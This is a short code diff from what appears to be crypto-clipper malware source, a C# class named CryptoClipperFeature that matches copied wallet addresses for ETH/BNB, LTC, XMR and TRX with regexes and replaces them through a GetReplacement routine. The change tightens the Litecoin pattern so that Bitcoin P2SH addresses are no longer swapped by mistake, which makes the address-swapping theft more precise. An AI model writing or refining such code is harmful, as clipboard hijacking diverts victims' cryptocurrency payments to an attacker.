@@ -31,7 +31,8 @@ internal static class CryptoClipperFeature
         // ETH and BNB share the 0x hex format — indistinguishable by address alone.
         // One row handles both; GetReplacement tries ETH address first, then BNB.
         ("ETH/BNB", new Regex(@"^0x[a-fA-F0-9]{40}$",                            RegexOptions.Compiled)),
-        ("LTC",     new Regex(@"^(L|M|3)[a-zA-Z0-9]{26,33}$",                    RegexOptions.Compiled)),
+        // L... and M... are LTC-only. 3... is identical to BTC P2SH — excluded to avoid false replacement.
+        ("LTC",     new Regex(@"^(L|M)[a-zA-Z0-9]{26,33}$",                      RegexOptions.Compiled)),
         ("XMR",     new Regex(@"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$",             RegexOptions.Compiled)),
         // Specific-prefix chains before the generic SOL Base58 pattern
         ("TRX",     new Regex(@"^T[1-9A-HJ-NP-Za-km-z]{33}$",                    RegexOptions.Compiled)),
